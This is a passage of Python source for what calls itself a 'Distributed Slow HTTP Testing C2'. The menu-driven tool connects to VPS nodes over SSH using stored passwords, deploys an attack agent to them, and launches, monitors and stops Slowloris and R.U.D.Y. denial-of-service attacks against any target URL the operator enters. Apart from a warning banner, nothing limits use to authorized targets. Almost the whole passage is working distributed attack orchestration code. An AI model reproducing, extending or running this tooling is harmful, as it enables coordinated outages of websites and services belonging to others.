        # Set permissions and test
        final_commands = [
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "python3 -m py_compile /tmp/slowhttp_c2/agent.py",  # Compile to check syntax
            "python3 /tmp/slowhttp_c2/agent.py --help | head -5"  # Test execution
        ]
        
        for i, cmd in enumerate(final_commands):
            success, output = self.execute_command(ip, cmd, timeout=20)
            if not success:
                return False, f"Final step {i+1} failed: {output}"
        
        return True, "Agent deployed and tested successfully"
    
    def get_connection_status(self, ip):
        """Check if connection is active"""
        return ip in self.connections and self._check_connection_alive(ip)

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
        self.status_check_interval = 5  # seconds
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with comprehensive error handling and auto-reconnect"""
        
        # Parse target URL properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
        else:
            target_host = target_url.split(':')[0].split('/')[0]
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters,
            'vps_status': {}
        }
        
        logger.info(f"Launching {attack_type} attack on {target_host}")
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 1000)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        # Get all VPS data from database for reconnection
        all_vps_data = {vps[1]: vps for vps in self.db_manager.get_all_vps()}
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Check connection status and reconnect if necessary
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
                
                vps_data = all_vps_data.get(vps_ip)
                if vps_data:
                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
                        vps_data[1], vps_data[2], vps_data[3], vps_data[4]
                    )
                    if reconnect_success:
                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
                        self.db_manager.update_vps_status(vps_ip, 'online')
                    else:
                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
                        continue
                else:
                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
                    continue
            
            # Build attack command
            cmd = self._build_attack_command(target_url, attack_type, parameters)
            
            # Execute with longer timeout and better error detection
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            # Better success detection
            if success and self._is_attack_launched_successfully(output):
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                
                # Store VPS status in attack info
                self.active_attacks[session_id]['vps_status'][vps_ip] = {
                    'status': 'attacking',
                    'launch_time': datetime.now().isoformat(),
                    'pid': self._extract_pid(output)
                }
                
                # Verify agent is actually running
                time.sleep(2)
                verify_cmd = "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l"
                verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, verify_cmd, timeout=10)
                
                if verify_success and verify_output.strip() != '0':
                    print(f"  {Colors.GREEN}→ Agent verified running ({verify_output.strip()} processes){Colors.RESET}")
                else:
                    print(f"  {Colors.YELLOW}→ Warning: Agent verification failed{Colors.RESET}")
                
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                # Detailed error logging
                error_details = self._analyze_launch_error(output)
                failed_vps.append(f"{vps_ip}: {error_details}")
        
        # Update database with results
        self.db_manager.update_attack_status(
            session_id, 
            'running' if success_count > 0 else 'failed',
            {'success_count': success_count, 'failed_vps': failed_vps}
        )
        
        if success_count > 0:
            # Start monitoring thread
            self._start_monitoring_thread(session_id)
            
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            if failed_vps:
                print(f"{Colors.YELLOW}[FAILED VPS]:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  {failure}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            print(f"{Colors.YELLOW}[TROUBLESHOOTING TIPS]:{Colors.RESET}")
            print(f"  1. Verify VPS connections: Option 2 - Test All Connections")
            print(f"  2. Check agent deployment: Option 3 - Deploy Agents")
            print(f"  3. Test single VPS: Option 5 - Test Single VPS")
            for failure in failed_vps:
                print(f"  {failure}")
            return False
    
    def _extract_pid(self, output):
        """Extract PID from launch output"""
        pid_match = re.search(r'PID:\s*(\d+)', output)
        if pid_match:
            return pid_match.group(1)
        return None
    
    def _is_attack_launched_successfully(self, output):
        """Better detection of successful attack launch"""
        success_indicators = [
            "Attack launched with PID",
            "SLOWLORIS] Starting attack",
            "R.U.D.Y] Starting",
            "nohup: ignoring input",
            "Creating initial connections"
        ]
        
        return any(indicator in output for indicator in success_indicators)
    
    def _analyze_launch_error(self, output):
        """Analyze launch error for better debugging"""
        if "Permission denied" in output:
            return "Permission denied - check SSH credentials"
        elif "No such file" in output:
            return "Agent file not found - redeploy agent"
        elif "python3: command not found" in output:
            return "Python3 not installed on VPS"
        elif "Connection refused" in output:
            return "Target refuses connections"
        elif "Traceback" in output:
            return f"Python error - {output.split('Traceback')[1][:100]}..."
        elif output.strip() == "":
            return "Command executed but no output (timeout?)"
        else:
            return f"Unknown error - {output[:150]}..."
    
    def _build_attack_command(self, target_url, attack_type, parameters):
        """Build attack command with better error handling and security"""
        connections = max(1, parameters.get('connections', 100))
        delay = max(0, parameters.get('delay', 15))
        duration = parameters.get('duration', 0)
        
        # Clean target parsing
        target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        
        # Enhanced command with better logging
        cmd = "cd /tmp/slowhttp_c2 && "
        
        # Check if agent exists
        cmd += "if [ ! -f agent.py ]; then echo 'ERROR: agent.py not found'; exit 1; fi && "
        
        # Launch with nohup and proper logging
        timestamp = int(time.time())
        log_file = f"attack_{timestamp}.log"
        
        cmd += f"nohup python3 agent.py '{target_clean}' {attack_type} "
        cmd += f"--connections {connections} --delay {delay} "
        
        if duration > 0:
            cmd += f"--duration {duration} "
        
        # Better logging and PID capture
        cmd += f"> {log_file} 2>&1 & "
        cmd += "sleep 2 && "
        cmd += "PID=$! && "
        cmd += "echo 'Attack launched with PID:' $PID && "
        cmd += "ps aux | grep 'python3.*agent.py' | grep -v grep | head -1"
        
        return cmd
    
    def _start_monitoring_thread(self, session_id):
        """Start a background thread to monitor attack status"""
        if session_id in self.monitoring_threads and self.monitoring_threads[session_id].is_alive():
            return
            
        def monitor_thread():
            logger.info(f"Starting monitoring thread for session {session_id}")
            while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
                try:
                    status = self.get_attack_status(session_id)
                    
                    # Record status in database
                    for vps_ip, vps_status in status.items():
                        self.db_manager.record_attack_result(
                            session_id,
                            vps_ip,
                            vps_status.get('active_processes', 0),
                            vps_status.get('connections', 0),
                            vps_status.get('status', 'unknown'),
                            vps_status.get('cpu_usage', None),
                            vps_status.get('memory_usage', None),
                            vps_status.get('errors', 0)
                        )
                    
                    # Check if attack is still running
                    active_vps = sum(1 for vs in status.values() if vs.get('status') == 'attacking')
                    if active_vps == 0 and len(status) > 0:
                        logger.info(f"Attack {session_id} appears to have stopped (no active VPS)")
                        self.active_attacks[session_id]['status'] = 'completed'
                        self.db_manager.update_attack_status(session_id, 'completed')
                        break
                        
                except Exception as e:
                    logger.error(f"Error in monitoring thread for session {session_id}: {str(e)}")
                
                time.sleep(self.status_check_interval)
                
            logger.info(f"Monitoring thread for session {session_id} stopped")
        
        # Start thread
        thread = threading.Thread(target=monitor_thread, daemon=True)
        thread.start()
        self.monitoring_threads[session_id] = thread
    
    def stop_attack(self, session_id):
        """Enhanced attack stopping with verification"""
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Enhanced process killing sequence
            commands = [
                "pkill -f 'python3.*agent.py' >/dev/null 2>&1 || true",
                "sleep 1",
                "pkill -9 -f 'agent.py' >/dev/null 2>&1 || true", 
                "killall python3 >/dev/null 2>&1 || true",
                "sleep 1",
                # Verify cleanup
                "ps aux | grep 'agent.py' | grep -v grep | awk '{print $2}' | xargs kill -9 >/dev/null 2>&1 || true",
                "sleep 1",
                "ps aux | grep 'agent.py' | grep -v grep | wc -l"
            ]
            
            remaining_procs = None
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if "wc -l" in cmd and success and output.strip().isdigit():
                    remaining_procs = int(output.strip())
            
            if remaining_procs is not None and remaining_procs == 0:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            elif remaining_procs is not None and remaining_procs > 0:
                print(f"{Colors.YELLOW}PARTIAL ({remaining_procs} remaining){Colors.RESET}")
                stop_count += 1  # Still count as attempt
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
        
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        
        # Update database
        self.db_manager.update_attack_status(
            session_id, 
            'stopped', 
            {'stopped_vps': stop_count}
        )
        
        print(f"\n{Colors.GREEN}[SUCCESS] Stop command sent to {stop_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
        return True, f"Attack stopped on {stop_count} nodes"
    
    def get_attack_status(self, session_id):
        """Enhanced attack status with better process detection and metrics"""
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            # Multiple commands to detect running processes
            commands = [
                "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l",
                "pgrep -f 'agent.py' 2>/dev/null | wc -l",
                "netstat -an 2>/dev/null | grep ESTABLISHED | wc -l",
                # Get status file if it exists
                "cat /tmp/slowhttp_c2/status.json 2>/dev/null || echo '{}'"
            ]
            
            active_processes = 0
            established_connections = 0
            status_data = {}
            
            for i, cmd in enumerate(commands):
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if success:
                    if i < 2 and output.strip().isdigit():  # Process count commands
                        active_processes = max(active_processes, int(output.strip()))
                    elif i == 2 and output.strip().isdigit():  # Network connections
                        established_connections = int(output.strip())
                    elif i == 3:  # Status file
                        try:
                            status_data = json.loads(output)
                        except:
                            status_data = {}
            
            # Get additional system info if processes are running
            cpu_usage = None
            memory_usage = None
            if active_processes > 0:
                # Get CPU usage
                cpu_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $9}'"
                success, output = self.ssh_manager.execute_command(vps_ip, cpu_cmd)
                if success and output.strip() and output.strip().replace('.', '', 1).isdigit():
                    cpu_usage = float(output.strip())
                
                # Get memory usage
                mem_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $10}'"
                success, output = self.ssh_manager.execute_command(vps_ip, mem_cmd)
                if success and output.strip() and output.strip().replace('.', '', 1).isdigit():
                    memory_usage = float(output.strip())
            
            # Combine all data
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle',
                'connections': established_connections,
                'connections_info': f"({established_connections} est. conns)" if established_connections > 0 else "",
                'cpu_usage': cpu_usage,
                'memory_usage': memory_usage,
                'cpu_info': f" (CPU: {cpu_usage}%)" if cpu_usage is not None else "",
                'bytes_sent': status_data.get('bytes_sent', 0),
                'errors': status_data.get('errors', 0),
                'uptime': status_data.get('uptime', 0)
            }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        for ip in list(self.ssh_manager.connections.keys()):
            self.ssh_manager.disconnect_vps(ip)
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                         ENHANCED EDITION v3.0                               ║
╚════════════════════════════════════════════════════════════════════════════╝

{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}

"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Distributed Attack (ENHANCED)
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True, validate_func=None):
        """Enhanced input with validation function support"""
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                
                if not required and not value:
                    return value
                    
                if required and not value:
                    print(f"{Colors.RED}This field is required{Colors.RESET}")
                    continue
                    
                if validate_func and value:
                    valid, message = validate_func(value)
                    if not valid:
                        print(f"{Colors.RED}{message}{Colors.RESET}")
                        continue
                        
                return value
            except KeyboardInterrupt:
                return None
    
    def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location':<15} {'Last Seen'}")
                print("-" * 80)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    last_seen = vps[7][:19] if vps[7] else 'Never'
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {(vps[8] or 'Unknown'):<15} {last_seen}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections (ENHANCED)
{Colors.GREEN}[3]{Colors.RESET} Deploy Enhanced Agents to All
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[6]{Colors.RESET} View VPS Details
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '6':
                self.view_vps_details()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            # Validate IP address
            def validate_ip(ip):
                return self.security_manager.validate_ip(ip), "Invalid IP address format"
                
            # Validate port number
            def validate_port(port):
                try:
                    port_num = int(port)
                    if 1 <= port_num <= 65535:
                        return True, ""
                    return False, "Port must be between 1 and 65535"
                except ValueError:
                    return False, "Port must be a number"
            
            ip = self.input_with_prompt("IP Address: ", validate_func=validate_ip)
            if not ip:
                return
            
            username = self.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.input_with_prompt("SSH Port (default 22): ", False, validate_port) or "22"
            port = int(port)
            
            location = self.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id, message = self.db_manager.add_vps(ip, username, encrypted_password, port, location)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                    
                    # Get system info
                    print(f"{Colors.YELLOW}[INFO] Gathering system information...{Colors.RESET}")
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                        print(f"{Colors.GREEN}[SUCCESS] System information collected{Colors.RESET}")
                        
                        # Display system info
                        print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                        for key, value in system_info.items():
                            print(f"  {key.capitalize()}: {value}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        """Enhanced connection testing with better error reporting"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS (ENHANCED){Colors.RESET}")
        print("-" * 50)
        
        online_count = 0
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
            
            if success:
                # Test command execution
                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
                if cmd_success:
                    print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
                    online_count += 1
                    
                    # Update system info
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                else:
                    print(f"{Colors.YELLOW}CONNECTED BUT CMD FAILED{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connected but command execution failed")
            else:
                print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'offline', f"Connection failed: {message[:100]}")
        
        print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def view_vps_details(self):
        """View detailed information about a VPS"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}VIEW VPS DETAILS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[2]}@{vps[1]}:{vps[4]})")
        
        try:
            choice = self.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                self.clear_screen()
                print(f"\n{Colors.BOLD}VPS DETAILS: {vps[1]}{Colors.RESET}")
                print("=" * 50)
                
                # Basic info
                print(f"\n{Colors.BOLD}BASIC INFORMATION:{Colors.RESET}")
                print(f"IP Address: {vps[1]}")
                print(f"Username: {vps[2]}")
                print(f"SSH Port: {vps[4]}")
                print(f"Status: {Colors.GREEN if vps[5] == 'online' else Colors.RED}{vps[5]}{Colors.RESET}")
                print(f"Location: {vps[8] or 'Unknown'}")
                print(f"Added: {vps[6][:19] if vps[6] else 'Unknown'}")
                print(f"Last Seen: {vps[7][:19] if vps[7] else 'Never'}")
                
                # System info
                system_info = {}
                if vps[11]:  # system_info column
                    try:
                        system_info = json.loads(vps[11])
                    except:
                        system_info = {}
                
                if system_info:
                    print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                    for key, value in system_info.items():
                        print(f"{key.capitalize()}: {value}")
                
                # Last check result
                if vps[10]:  # last_check_result column
                    print(f"\n{Colors.BOLD}LAST CHECK RESULT:{Colors.RESET}")
                    print(vps[10])
                
                # Real-time status check
                print(f"\n{Colors.BOLD}REAL-TIME STATUS CHECK:{Colors.RESET}")
                if self.ssh_manager.get_connection_status(vps[1]):
                    print(f"{Colors.GREEN}Connection: ACTIVE{Colors.RESET}")
                    
                    # Check disk space
                    success, output = self.ssh_manager.execute_command(vps[1], "df -h / | tail -1 | awk '{print $5}'")
                    if success:
                        disk_usage = output.strip()
                        print(f"Disk Usage: {disk_usage}")
                    
                    # Check memory
                    success, output = self.ssh_manager.execute_command(vps[1], "free -m | grep Mem | awk '{print $3,$2}'")
                    if success:
                        parts = output.strip().split()
                        if len(parts) == 2:
                            used, total = parts
                            print(f"Memory: {used} MB used / {total} MB total")
                    
                    # Check load average
                    success, output = self.ssh_manager.execute_command(vps[1], "uptime | awk -F'load average:' '{print $2}'")
                    if success:
                        load = output.strip()
                        print(f"Load Average: {load}")
                    
                    # Check agent status
                    success, output = self.ssh_manager.execute_command(vps[1], "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l")
                    if success and output.strip().isdigit():
                        agent_count = int(output.strip())
                        if agent_count > 0:
                            print(f"{Colors.GREEN}Agent Status: RUNNING ({agent_count} processes){Colors.RESET}")
                            
                            # Get agent details
                            success, output = self.ssh_manager.execute_command(vps[1], "ps aux | grep 'python3.*agent.py' | grep -v grep | head -1")
                            if success and output:
                                print(f"Agent Process: {output.strip()}")
                        else:
                            print(f"{Colors.YELLOW}Agent Status: NOT RUNNING{Colors.RESET}")
                else:
                    print(f"{Colors.RED}Connection: INACTIVE{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def test_single_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[2]}@{vps[1]}:{vps[4]})")
        
        try:
            choice = self.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
                
                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
                    
                    # Test command execution
                    print(f"{Colors.CYAN}[TESTING] Command execution...{Colors.RESET}")
                    success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Command execution test passed{Colors.RESET}")
                        print(f"Output: {output}")
                        
                        # Test network connectivity
                        print(f"{Colors.CYAN}[TESTING] Network connectivity...{Colors.RESET}")
                        success, output = self.ssh_manager.execute_command(ip, "ping -c 3 8.8.8.8 | grep 'time='")
                        
                        if success:
                            print(f"{Colors.GREEN}[SUCCESS] Network connectivity test passed{Colors.RESET}")
                            print(f"Output: {output}")
                        else:
                            print(f"{Colors.RED}[ERROR] Network connectivity test failed: {output}{Colors.RESET}")
                        
                        # Update status
                        self.db_manager.update_vps_status(ip, 'online')
                    else:
                        print(f"{Colors.RED}[ERROR] Command execution failed: {output}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline')
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def deploy_all_agents(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING ENHANCED AGENTS TO ALL ONLINE VPS{Colors.RESET}")
        print("-" * 50)
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps[1]
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
            else:
                print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} enhanced agents deployed successfully{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            choice = self.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps[1]}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    # Disconnect if connected
                    self.ssh_manager.disconnect_vps(vps[1])
                    
                    # Remove from database
                    if self.db_manager.remove_vps(vps[1]):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        self.clear_screen()
        self.print_banner()
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"{Colors.BOLD}LAUNCH ENHANCED DISTRIBUTED ATTACK{Colors.RESET}")
        print("=" * 60)
        
        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            # Target configuration
            print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
            
            # URL validation function
            def validate_url(url):
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                try:
                    result = urlparse(url)
                    if all([result.scheme, result.netloc]):
                        return True, ""
                    return False, "Invalid URL format"
                except:
                    return False, "Invalid URL"
            
            target_url = self.input_with_prompt("Target URL (e.g., http://target.com): ", validate_func=validate_url)
            if not target_url:
                return
            
            # Parse and validate target
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
